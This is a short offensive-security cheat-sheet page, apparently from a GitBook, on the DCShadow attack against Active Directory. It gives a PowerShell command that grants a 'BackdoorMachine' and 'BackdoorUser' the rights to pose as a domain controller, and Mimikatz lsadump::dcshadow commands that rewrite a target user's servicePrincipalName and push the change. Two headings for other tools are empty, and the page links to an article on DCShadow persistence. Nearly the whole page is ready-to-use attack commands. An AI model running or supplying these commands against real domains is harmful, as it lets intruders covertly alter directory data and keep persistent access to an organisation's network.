# 🤖 DCShadow

{% code overflow="wrap" %}
```powershell
Set-DCShadowPermissions -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
```
{% endcode %}

<figure><img src="../.gitbook/assets/DC Shadow.png" alt="DCShadow"><figcaption><p>DCShadow</p></figcaption></figure>

### DCShadow using MimiKatz

{% code overflow="wrap" %}
```
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"
```
{% endcode %}

```
lsadump::dcshadow /push
```

### DCShadow using CrackMapExec

### DCShadow using Metasploit

{% embed url="https://stealthbits.com/blog/creating-persistence-dcshadow/" %}
